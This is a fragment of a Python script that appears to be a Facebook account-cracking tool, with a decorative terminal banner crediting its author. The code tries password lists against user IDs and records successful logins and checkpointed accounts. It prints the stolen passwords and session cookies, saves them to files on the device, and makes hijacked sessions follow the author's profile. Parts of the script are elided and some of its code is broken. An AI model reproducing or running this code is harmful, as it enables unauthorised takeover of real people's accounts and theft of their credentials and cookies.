...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/sksuyaif.hassan', {
...
logo = ("""
 ...
 \033[1;93m╔═════════════════[\033[1;32m Suyaif -𝙁𝙍𝙊 \033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] develop BY\33[0;m   : \033[1;96m sk suyaif hasan     \033[1;32m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m Cyber.sk suyaif hassan      \033[1;32m║
 ...
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0.1                  \033[1;32m ║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m║
 ...
 \033[1;93m╚====+====+====+===+==═[\033[1;93m sk - Army \033[1;32m]════===══════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/sksuyaif.hassan)
    print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Sk. suyaif-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Sk.suyaif-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;33m [Sk.suyaif-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                open('/sdcard/Sk.suyaif-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
